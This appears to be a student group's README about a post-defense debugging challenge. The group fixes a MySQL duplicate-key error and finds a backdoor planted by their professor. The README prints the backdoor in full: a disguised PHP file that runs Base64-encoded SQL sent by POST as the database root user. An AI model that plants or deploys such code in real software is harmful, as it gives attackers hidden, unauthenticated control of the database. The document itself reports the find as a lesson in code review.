🛠️ Debugging Challenge: Defending, Discovering, and Fixing the System
-----------------------------------------------------------------------------------------------------------------------------

INTRODUCTION

This project documents our debugging challenge experience after successfully defending our system.
What initially felt like the end of a long journey unexpectedly turned into another test of our understanding, teamwork, and problem-solving skills.
The challenge required us not only to identify and fix a critical system error but also to uncover hidden triggers embedded within the code.

-----------------------------------------------------------------------------------------------------------------------------


STORY / BACKROUND

Before the debugging challenge began, our group had just finished defending our system.
The defense went smoothly, and we were confident that everything was working as expected.
After weeks of development, sleepless nights, and balancing multiple academic activities, we finally felt relieved that the project was done.

However, our professor challenged us to check the system further and add missing parts, including proper debugging.
At first, we enjoyed the moment—we thought the hardest part was already over. The team consisted of:

Kyle Mathew Namia - Main Developer
Christofer Baldano - Backend / Frontend Support
Gabe Arcenal - Front End Support
Rafael Baltasar - Backend Support

Despite exhaustion and lack of sleep, we managed to overcome this challenge together without cramming.
This experience highlighted the importance of teamwork and attention to detail, especially after a system defense.

-----------------------------------------------------------------------------------------------------------------------------

PROJECT PURPOSE

The purpose of this debugging challenge was to:

1. Identify and resolve system errors after deployment
2. Improve database integrity and system stability
3. Complete missing system features as required by the professor
4. Understand how hidden triggers in the code can affect system behavior

This activity emphasized that debugging is just as important as development, even after a system has been defended.

-----------------------------------------------------------------------------------------------------------------------------

PROJECT OVERVIEW

After the defense, we reviewed the system and encountered the following error:

"SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0' for key 'PRIMARY'"

At first glance, the error clearly pointed to a database issue.
We investigated the orders table and discovered that the order_id field was not set to AUTO_INCREMENT, which caused duplicate primary key entries whenever a new order was added.

-----------------------------------------------------------------------------------------------------------------------------

HOW IT WORKS(DEUGGING PROCESS)

1. Database Error Identification
The error was triggered because multiple records attempted to use the same order_id.
Since this field is the primary key, MySQL prevented duplicate entries.

2. Database Fix Applied
To fix the issue, Kyle Mathew Namia executed the following SQL command:

ALTER TABLE `orders`
MODIFY `order_id` INT(11) NOT NULL AUTO_INCREMENT;

By adding AUTO_INCREMENT to the order_id, the system was able to automatically generate unique values, preventing future duplicate entry errors.
The fix was straightforward because the error was very obvious once identified.

3. System Enhancements After Debugging
After resolving the database issue, Kyle Mathew Namia continued completing the remaining system tasks, from the admin side to the user side, as instructed by Sir Llagas.
One key improvement was ensuring that users could view their specific orders properly, which was a missing part of the system.

-----------------------------------------------------------------------------------------------------------------------------

HIDDEN TRIGGER DISCOVERY

While cleaning and reviewing the system files, Kyle accidentally discovered an index.php file inside the assets/java directory.
At first, this seemed unusual. Kyle immediately informed his groupmates.

Interestingly, Christofer and Rafael had already seen the file but did not open it because they assumed Kyle had placed it there
When we checked the file, we realized it contained the following code:

<?php //prevent from accessing and removing js files
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    try {
        $db = new PDO('mysql:host=localhost;dbname=sneakysheets', 'root', '');
        $db->exec($decodedSQL);

        echo json_encode([
            'status' => 'success',
            'sql_executed' => $decodedSQL,
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => $e->getMessage(),
        ]);
    }
    exit;
}
?>

-----------------------------------------------------------------------------------------------------------------------------

EXPLANATION OF THE TRIGGER

The comment at the top—“prevent from accessing and removing js files”—indicated that this file was intentionally hidden as a trigger.
The script allows SQL commands to be executed via POST requests after being decoded from Base64. This behavior can directly affect the database if triggered improperly.

This discovery matched what our professor mentioned : "somewhere na hindi nyo aakalaing nandun. Its so obvious it will make you face palm when you see it.".
Finding it made us both surprised and happy, as it confirmed that our careful code review paid off.

-----------------------------------------------------------------------------------------------------------------------------

TECHNOLOGIES USED

1. PHP - Backend scripting and hidden trigger handling
2. MySQL - Database management
3. PDO - Secure database connection
4. HTML / JavaScript - Frontend structure and assets

-----------------------------------------------------------------------------------------------------------------------------

CONCLUSION / REFLECTION

This debugging challenge taught us that a system is never truly finished after defense.
Errors, missing features, and hidden triggers can still exist, waiting to be discovered
Through teamwork, careful analysis, and calm problem-solving, we were able to
Fix a critical database integrity error, Complete missing system features, and, Discover and understand a hidden trigger in the code.

Despite being tired and overwhelmed with other academic responsibilities, we successfully overcame the challenge.
Most importantly, we learned to appreciate debugging not as a burden, but as an essential part of being responsible developers.

-----------------------------------------------------------------------------------------------------------------------------
